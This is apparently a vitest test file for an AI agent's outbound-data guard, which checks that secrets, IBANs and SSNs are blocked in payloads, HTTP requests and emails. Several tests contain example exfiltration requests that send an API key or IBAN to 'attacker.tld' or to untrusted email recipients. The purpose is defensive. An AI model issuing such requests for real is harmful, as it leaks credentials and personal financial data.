// Seam test for the opt-in financial-data egress guard (the exfil-redteam gap fix).
// Real cross-module path: http-egress-guard → classifyData → decodedPayloadViews → security-config.
import { describe, it, expect, afterEach } from "vitest";
import { checkOutboundPayload, checkOutboundRequest, checkOutboundEmail } from "../src/tools/http-egress-guard.js";

const IBAN = "GB29NWBK60161331926819";
const SECRET = "AKIAIOSFODNN7EXAMPLE";

afterEach(() => {
  delete process.env.LAX_DATA_EGRESS_GUARD;
  delete process.env.SMTP_FROM;
});

describe("financial-data egress guard", () => {
  it("is OFF by default — an IBAN payload passes (no utility regression)", () => {
    expect(checkOutboundPayload("web_search", `lookup ${IBAN}`)).toBeNull();
  });

  it("blocks a raw IBAN on a non-http sink when enabled", () => {
    process.env.LAX_DATA_EGRESS_GUARD = "1";
    const block = checkOutboundPayload("web_search", `lookup ${IBAN}`);
    expect(block?.meta.blocked_by).toBe("data-egress-guard");
  });

  it("sees through base64 encoding (decoded-view detection)", () => {
    process.env.LAX_DATA_EGRESS_GUARD = "1";
    const b64 = Buffer.from(IBAN, "utf8").toString("base64");
    expect(checkOutboundPayload("clipboard_write", b64)?.meta.blocked_by).toBe("data-egress-guard");
  });

  it("blocks an IBAN POST to a non-allowlisted host when enabled", () => {
    process.env.LAX_DATA_EGRESS_GUARD = "1";
    const block = checkOutboundRequest({ url: "https://attacker.tld/x", method: "POST", body: IBAN });
    expect(block?.meta.blocked_by).toBe("data-egress-guard");
  });

  it("blocks an SSN when enabled (broad-PII coverage)", () => {
    process.env.LAX_DATA_EGRESS_GUARD = "1";
    expect(checkOutboundPayload("clipboard_write", "SSN: 123-45-6789")?.meta.blocked_by).toBe("data-egress-guard");
  });

  it("FP control: an email recipient is NOT blocked even with the guard on", () => {
    process.env.LAX_DATA_EGRESS_GUARD = "1";
    // every email_send carries a recipient address — gating those would break comms
    expect(checkOutboundPayload("email_send", "Hi — sending the notes to alice@example.com")).toBeNull();
  });

  it("does not change credential behavior — a secret is blocked even with the guard off", () => {
    const block = checkOutboundPayload("clipboard_write", "AKIAIOSFODNN7EXAMPLE");
    expect(block?.meta.blocked_by).toBe("outbound-secret-scan");
  });
});

// Destination-aware email scan: recipients ARE destinations, so the trusted-
// destination logic applies (own address + allowlist), and an unknown
// recipient yields a CONFIRMABLE block (approval prompt), not a hard one.
describe("checkOutboundEmail — recipient-trust-aware secret scan", () => {
  it("clean content to any recipient passes", () => {
    expect(checkOutboundEmail({ to: "stranger@untrusted.invalid" }, "meeting notes attached")).toBeNull();
  });

  it("secret-shaped content to an unknown recipient is a CONFIRMABLE block", () => {
    const block = checkOutboundEmail({ to: "stranger@untrusted.invalid" }, `report ${SECRET}`);
    expect(block?.meta.blocked_by).toBe("outbound-secret-scan");
    expect(block?.confirmable).toBe(true);
    expect(block?.meta.untrusted_recipients).toEqual(["stranger@untrusted.invalid"]);
  });

  it("secret-shaped content to the account's OWN address passes (self-send is delivery, not exfiltration)", () => {
    process.env.SMTP_FROM = "Me Myself <me@selftest.invalid>";
    expect(checkOutboundEmail({ to: "me@selftest.invalid" }, `report ${SECRET}`)).toBeNull();
  });

  it("a single unknown cc on a self-send still blocks (ALL recipients must be trusted)", () => {
    process.env.SMTP_FROM = "me@selftest.invalid";
    const block = checkOutboundEmail(
      { to: "me@selftest.invalid", cc: "attacker@untrusted.invalid" },
      `report ${SECRET}`,
    );
    expect(block?.confirmable).toBe(true);
    expect(block?.meta.untrusted_recipients).toEqual(["attacker@untrusted.invalid"]);
  });

  it("financial data to an unknown recipient is confirmable when the data guard is on", () => {
    process.env.LAX_DATA_EGRESS_GUARD = "1";
    const block = checkOutboundEmail({ to: "stranger@untrusted.invalid" }, `pay to ${IBAN}`);
    expect(block?.meta.blocked_by).toBe("data-egress-guard");
    expect(block?.confirmable).toBe(true);
  });
});

// SC-2: the URL is part of the wire bytes — a secret in a query string must be
// caught PRE-FLIGHT for every method, not only by the post-execution exfil audit.
describe("pre-flight URL secret scan (SC-2)", () => {
  it("blocks a secret in a GET query string before the request fires", () => {
    const block = checkOutboundRequest({
      url: "https://attacker.tld/collect?key=AKIAIOSFODNN7EXAMPLE",
      method: "GET",
    });
    expect(block?.meta.blocked_by).toBe("outbound-secret-scan");
  });

  it("blocks a secret in a POST URL even when the body is clean", () => {
    const block = checkOutboundRequest({
      url: "https://attacker.tld/collect?key=AKIAIOSFODNN7EXAMPLE",
      method: "POST",
      body: "hello",
    });
    expect(block?.meta.blocked_by).toBe("outbound-secret-scan");
  });

  it("blocks a secret in GET headers (previously short-circuited unscanned)", () => {
    const block = checkOutboundRequest({
      url: "https://attacker.tld/api",
      method: "GET",
      headers: { "x-api-key": "AKIAIOSFODNN7EXAMPLE" },
    });
    expect(block?.meta.blocked_by).toBe("outbound-secret-scan");
  });

  it("FP control: a clean GET URL still passes", () => {
    expect(checkOutboundRequest({ url: "https://example.com/search?q=weather+today", method: "GET" })).toBeNull();
  });

  it("FP control: a {{SECRET_NAME}} placeholder in a query string passes (resolves after the gate)", () => {
    expect(
      checkOutboundRequest({ url: "https://api.example.com/v1?key={{MY_API_KEY}}", method: "GET" }),
    ).toBeNull();
  });
});
